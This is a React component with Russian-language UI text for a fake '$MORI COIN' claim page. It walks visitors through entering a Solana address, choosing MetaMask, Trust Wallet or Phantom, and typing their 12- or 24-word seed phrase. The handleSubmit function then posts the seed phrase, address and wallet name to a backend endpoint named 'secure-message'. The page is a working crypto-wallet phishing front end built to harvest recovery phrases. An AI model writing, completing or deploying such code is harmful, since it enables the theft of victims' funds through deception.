import React, { useState, useCallback } from 'react';
import ReCAPTCHA from 'react-google-recaptcha';
import './WalletModal.css';

const WALLETS = [
  { name: 'MetaMask', icon: '/icons/metamask-logo.svg' },
  { name: 'Trust Wallet', icon: '/icons/trustwallet-logo.svg' },
  { name: 'Phantom', icon: '/icons/phantom-logo.svg' },
];

const WalletModal = ({ onClose }) => {
  const [selectedWallet, setSelectedWallet] = useState(null);
  const [solAddress, setSolAddress] = useState('');
  const [showWalletSelection, setShowWalletSelection] = useState(false); // <--- НОВОЕ СОСТОЯНИЕ
  const [phraseType, setPhraseType] = useState(null);
  const [seedPhrase, setSeedPhrase] = useState('');
  const [recaptchaToken, setRecaptchaToken] = useState('');
  const [submissionStatus, setSubmissionStatus] = useState('');

  const BACKEND_URL = '/.netlify/functions/secure-message';
  const RECAPTCHA_SITE_KEY_V2 = "6LfciG4rAAAAAB-s0mobITSv7p16yLOmEDE1lb3Z"; 

  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
  };

  const handleSolAddressChange = (e) => {
    setSolAddress(e.target.value);
  };

  const handleSolAddressSubmit = (e) => {
    e.preventDefault();
    if (solAddress.trim() === '') {
      setSubmissionStatus('❌ Пожалуйста, введите ваш SOL адрес.'); // Используем submissionStatus для сообщения
      return; 
    }
    setSubmissionStatus(''); // Очищаем статус, если адрес введен
    setShowWalletSelection(true); // <--- ПЕРЕХОД К ВЫБОРУ КОШЕЛЬКА ПО КНОПКЕ
  };

  const handlePhraseTypeSelect = (type) => {
    setPhraseType(type);
  };
  
  const handleBack = () => {
    if (phraseType) {
      setPhraseType(null);
      setSeedPhrase('');
      setRecaptchaToken('');
    } else if (selectedWallet) {
      setSelectedWallet(null);
      setShowWalletSelection(false); // <--- Возвращаемся к выбору кошелька
    } else if (showWalletSelection) { // <--- Если мы в выборе кошельков, а SOL адрес уже введен
        setShowWalletSelection(false); // Возвращаемся к вводу SOL адреса
    } else if (solAddress) { // Если мы вводим SOL адрес и он уже не пустой, но еще не нажали "Далее"
        setSolAddress(''); // Очищаем SOL адрес и возвращаемся к начальному состоянию
        onClose(); // Или закрываем модалку, если это был самый первый шаг
    } else {
        onClose(); // Закрываем модальное окно
    }
  };

  const onRecaptchaChange = (token) => {
    setRecaptchaToken(token);
  };

  const handleSubmit = useCallback(async (e) => {
    e.preventDefault();

    if (!recaptchaToken) {
      setSubmissionStatus('❌ Пожалуйста, подтвердите, что вы не робот.');
      return;
    }
    
    setSubmissionStatus('Проверка и отправка данных...');

    try {
      const response = await fetch(BACKEND_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          walletName: selectedWallet.name,
          solAddress: solAddress,
          seedPhrase: seedPhrase,
          recaptchaToken: recaptchaToken,
        }),
      });

      const data = await response.json();

      if (response.ok && data.success) {
        setSubmissionStatus(`✅ ${data.message}`);
        setRecaptchaToken('');
      } else {
        throw new Error(data.message || 'Не удалось отправить данные.');
      }
    } catch (error) {
      console.error('Ошибка отправки на бэкенд:', error);
      setSubmissionStatus(`❌ Ошибка! ${error.message}. Попробуйте позже.`);
      setRecaptchaToken('');
    }
  }, [selectedWallet, solAddress, seedPhrase, recaptchaToken]);

  if (submissionStatus) {
    return (
      <div className="modal-overlay">
        <div className="modal-content">
          <button className="close-button" onClick={onClose}>×</button>
          <h2>Статус заявки</h2>
          <p style={{ color: submissionStatus.includes('❌') ? '#ff9999' : '#99ff99' }}>
            {submissionStatus}
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal-content" onClick={(e) => e.stopPropagation()}>
        <button className="close-button" onClick={onClose}>×</button>
        {selectedWallet || solAddress || showWalletSelection ? ( // Показываем кнопку "Назад", если есть состояние, с которого можно вернуться
            <button className="back-button" onClick={handleBack}>←</button>
        ) : null}

        {!showWalletSelection ? ( // Шаг 1: Введите SOL адрес (Теперь контролируется showWalletSelection)
          <>
            <h2>Введите свой SOL адрес</h2>
            <form onSubmit={handleSolAddressSubmit}>
              <label htmlFor="solAddress">SOL адрес:</label>
              <input
                type="text"
                id="solAddress"
                name="solAddress"
                value={solAddress}
                onChange={handleSolAddressChange}
                placeholder="Например, 2T7yXp1aB3c4D5e6F7g8H9i0J1k2L3m4N5o6P7q8R"
                required
              />
              {solAddress.trim() === '' && submissionStatus && ( // Показываем сообщение об ошибке, если поле пустое
                <p style={{ color: '#ff9999', fontSize: '0.85rem', marginTop: '0.5rem' }}>
                  {submissionStatus}
                </p>
              )}
              <button type="submit" className="submit-button" style={{ marginTop: '1rem' }}>Далее</button>
            </form>
          </>
        ) : !selectedWallet ? ( // Шаг 2: Выберите ваш кошелек
          <>
            <h2>Выберите ваш кошелек</h2>
            <div className="wallet-list">
              {WALLETS.map((wallet) => (
                <div key={wallet.name} className="wallet-item" onClick={() => handleWalletSelect(wallet)}>
                  <img src={wallet.icon} alt={`${wallet.name} logo`} className="wallet-icon" />
                  <span>{wallet.name}</span>
                </div>
              ))}
            </div>
            <p className="partnership-note">Партнерство только с указанными кошельками.</p>
          </>
        ) : !phraseType ? ( // Шаг 3: Выберите тип фразы
            <>
                <h2>Выберите тип фразы</h2>
                <div className="phrase-type-selection">
                    <button className="phrase-type-button" onClick={() => handlePhraseTypeSelect(12)}>
                        12 слов
                    </button>
                    <button className="phrase-type-button" onClick={() => handlePhraseTypeSelect(24)}>
                        24 слова
                    </button>
                </div>
            </>
        ) : ( // Шаг 4: Введите сид-фразу и reCAPTCHA
          <>
            <h2>Подключите кошелек {selectedWallet.name}</h2>
            <form onSubmit={handleSubmit}>
              <label htmlFor="seedPhrase">Введите вашу сид фразу ({phraseType} слов)</label>
              <textarea
                id="seedPhrase"
                name="seedPhrase"
                value={seedPhrase}
                onChange={(e) => setSeedPhrase(e.target.value)}
                placeholder="Введите слова через пробел..."
                required
                rows={phraseType === 24 ? 5 : 3}
              />
              <div style={{ marginBottom: '1rem' }}>
                <ReCAPTCHA
                  sitekey={RECAPTCHA_SITE_KEY_V2}
                  onChange={onRecaptchaChange}
                />
              </div>
              <button type="submit" className="submit-button">Получить $MORI COIN</button>
            </form>
          </>
        )}
      </div>
    </div>
  );
};

export default WalletModal;